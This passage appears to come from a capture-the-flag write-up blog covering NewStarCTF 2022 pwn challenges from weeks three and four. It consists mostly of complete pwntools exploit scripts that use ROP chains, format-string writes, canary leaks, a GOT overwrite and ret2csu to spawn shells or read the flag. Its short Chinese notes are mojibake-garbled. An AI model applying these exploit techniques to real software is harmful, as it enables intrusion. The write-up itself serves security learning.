class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sea(<span class="hljs-string">&#x27;give me your name: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>ru(<span class="hljs-string">&#x27;your name: aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>function_addr=uu64(rc(<span class="hljs-number">6</span>))<br>boy_next_door=function_addr+<span class="hljs-number">3</span><br>base=boy_next_door-<span class="hljs-number">0x128e</span><br>info(<span class="hljs-string">&quot;function_base&quot;</span>,base)<br>pop_rdi=base+<span class="hljs-number">0x1423</span><br>ret=base+<span class="hljs-number">0x101a</span><br>system=base+<span class="hljs-number">0x129d</span><br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;your age: &#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>stack_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#debug()</span><br>info(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>payload=flat(<span class="hljs-string">&#x27;sh flag\x00&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,pop_rdi,stack_addr-<span class="hljs-number">0x30</span>,system)<br>sea(<span class="hljs-string">&#x27;susu give me your wechat number: &#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK3">WEEK3</h2><h3 id="cat-flag">cat flag</h3><p>æç¤ºè¶å®ƒsleepæ—¶editæŠŠnameæ”¹ä¸ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28863</span> )<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input the file name you want to cat.\n&#x27;</span>,<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input new name you want to change.\n&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Read-Write">Read&amp;Write</h3><p>å­˜åœ¨æ•°ç»„è¶Šç•Œï¼Œå’Œå‘åè¯»å†™ï¼Œå¯ä»¥å‘åè¶Šç•Œæ³„éœ²libc_baseï¼Œç¨‹åºå®é™…åœ°å€ä»€ä¹ˆçš„ï¼Œç„¶åropä¸€ä¸‹å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    low_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    high_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">return</span> high_addr*(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)+low_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w</span>(<span class="hljs-params">idx,num</span>):<br>    high_num=<span class="hljs-built_in">int</span>(num/(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>))<br>    low_num=num%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment">#print(high_num)</span><br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(low_num))<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(high_num))<br><span class="hljs-comment">#--------------------------</span><br>base=s(<span class="hljs-number">0x110</span>)-elf.sym[<span class="hljs-string">&#x27;__libc_csu_init&#x27;</span>]<br>info(<span class="hljs-string">&quot;base&quot;</span>,base)<br>libc_base=s(<span class="hljs-number">0x12c</span>)-<span class="hljs-number">0x236190</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>ret=libc_base + <span class="hljs-number">0x22679</span><br>binsh=libc_base+<span class="hljs-number">0x1B45BD</span><br>system =libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>w(<span class="hljs-number">0x106</span>,ret)<br>w(<span class="hljs-number">0x108</span>,pop_rdi)<br>w(<span class="hljs-number">0x10a</span>,binsh)<br><span class="hljs-comment">#debug()</span><br>w(<span class="hljs-number">0x10c</span>,system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu1">ret2csu1</h3><p>æ€»è€Œè¨€ä¹‹å°±æ˜¯ç”¨ret2csuæ¥ropå‡ºexecve(â€œ/bin/catâ€,{â€œ/bin/catâ€,â€œ/flagâ€,NULL},0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br>elif select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = lambda data               :r.send(data) <br>sa      = lambda delim,data         :r.sendafter(delim, data)<br>sl      = lambda data               :r.sendline(data)<br>sla     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>def debug(cmd=<span class="hljs-string">&#x27;&#x27;):</span><br><span class="hljs-string">     gdb.attach(r,cmd)</span><br><span class="hljs-string">     pause()</span><br><span class="hljs-string">#------------------------</span><br><span class="hljs-string">def csu(rdi,rsi,rdx,function):</span><br><span class="hljs-string">    csu_front_addr=0x400710</span><br><span class="hljs-string">    csu_end_addr=0x40072A</span><br><span class="hljs-string">    payload = b&#x27;</span>&#x27;<br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br>#----------------<br>bincat=<span class="hljs-number">0x4007BB</span><br>flag=<span class="hljs-number">0x601050</span><br>execve=<span class="hljs-number">0x601068</span><br>payload=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+csu(bincat,flag,<span class="hljs-number">0</span>,execve)<br><span class="hljs-meta">#debug()</span><br>sea(<span class="hljs-string">&#x27;I hide some useful text in this elf.Remember to check it!\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="sheep-a-flag">sheep a flag</h3><p>å®Œå…¨å¯ä»¥æ‰‹åŠ¨èµ°ä¸€ä¸‹è¿·å®«ï¼Œctrl+cè½¬æ¢åˆ°è„šæœ¬ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¾€0x602080åœ°å€å†™0x1D4B42</p><p><a href="https://home.cnblogs.com/u/xyqer/">fmt</a>ä»è¿™ä½å¸ˆå‚…æŠ„äº†ä¸€ä¸ªï¼Œæ‡’å¾—å†™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sheep_a_flag&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>r.interactive()<br>payload=<span class="hljs-string">b&#x27;%29c%10$hhn%37c%11$hhn%9c%12$hhn&#x27;</span>+p64(<span class="hljs-number">0x602082</span>)+p64(<span class="hljs-number">0x602080</span>)+p64(<span class="hljs-number">0x602081</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK4">WEEK4</h2><h3 id="canary">canary</h3><p>ä¿æŠ¤å…¨å¼€</p><p>å­˜åœ¨ä¸¤ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="/2022/11/16/newstarctf2022/2.png" alt="2"></p><p>backdooré‡Œæœ‰systemï¼Œbssæ®µæœ‰/bin/sh</p><p><img src="/2022/11/16/newstarctf2022/3.png" alt="3"></p><p>æ€è·¯æ˜¯æ³„éœ²canaryï¼Œæ”¹moneyé•¿åº¦é€ æˆæº¢å‡ºï¼Œropå‡º system(/bin/sh)</p><p>åç§»ä¸º6</p><p><img src="/2022/11/16/newstarctf2022/4.png" alt="4"></p><p>gdbè°ƒè¯•å¯çœ‹åˆ°canaryåç§»ä¸º11</p><p><img src="/2022/11/16/newstarctf2022/5.png" alt="5"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25326</span> )<br>    libc = ELF(remote_libc)<br><span class="hljs-keyword">else</span>:<br>    r = gdb.debug(local_file)<br>    libc = ELF(local_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;pid&quot;</span>+<span class="hljs-built_in">str</span>(proc.pidof(r)))<br><span class="hljs-comment">#------------------------</span><br>offest=<span class="hljs-number">6</span><br>sla(<span class="hljs-string">&#x27;Now answer me, will you v me 50\n&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaa,%11$p,%17$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>true_main=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>pie_base=true_main-<span class="hljs-number">0x9e4</span><br>money=<span class="hljs-number">0x20206C</span><br>true_money=money+pie_base<br>info(<span class="hljs-string">&#x27;true_money&#x27;</span>,true_money)<br><span class="hljs-comment">#pause()</span><br>sla(<span class="hljs-string">&#x27;What do you want to say to the canary\n&#x27;</span>,<span class="hljs-string">&#x27;%200c%8$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(true_money))<br>pop_rdi=<span class="hljs-number">0xb33</span>+pie_base<br>binsh=<span class="hljs-number">0x202020</span>+pie_base<br>system=<span class="hljs-number">0x9DC</span>+pie_base<br>sl(flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>,canary,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>,pop_rdi,binsh,system))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="è¿™æ˜¯å †ğŸ´">è¿™æ˜¯å †ğŸ´</h3><p>ä¸‹æ ‡å¯ä»¥å°äº0ï¼Œbssæ®µæœ‰ä¸ªæŒ‡é’ˆæŒ‡å‘è‡ªå·±(è²Œä¼¼è¿˜æœ‰ä¸ªoff by null)ï¼ŒEditåŠŸèƒ½ç”¨è´Ÿæ•°é…åˆè¯¥æŒ‡é’ˆè¾¾æˆä»»æ„å†™</p><p>showåŠŸèƒ½æ³„éœ²libcåï¼Œæ”¹atoiä¸ºsystemï¼Œå¡«å…¥binsh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sea(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------</span><br>you_found_me=<span class="hljs-number">0x602080</span><br><span class="hljs-comment">#debug()</span><br>edit(-<span class="hljs-number">12</span>,flat(you_found_me,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show(-<span class="hljs-number">11</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>atoi_plt=<span class="hljs-number">0x602058</span><br>edit(-<span class="hljs-number">12</span>,flat(atoi_plt))<br><span class="hljs-comment">#print(p64(system)[0:6])</span><br>edit(-<span class="hljs-number">12</span>,p64(system)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>])<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="OhMyShellcode">OhMyShellcode</h3><p>å‘ƒå‘ƒå‘ƒï¼Œåªæ£€æµ‹åˆ°0x19,åªè¦syscallåœ¨0x19é•¿åº¦åå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 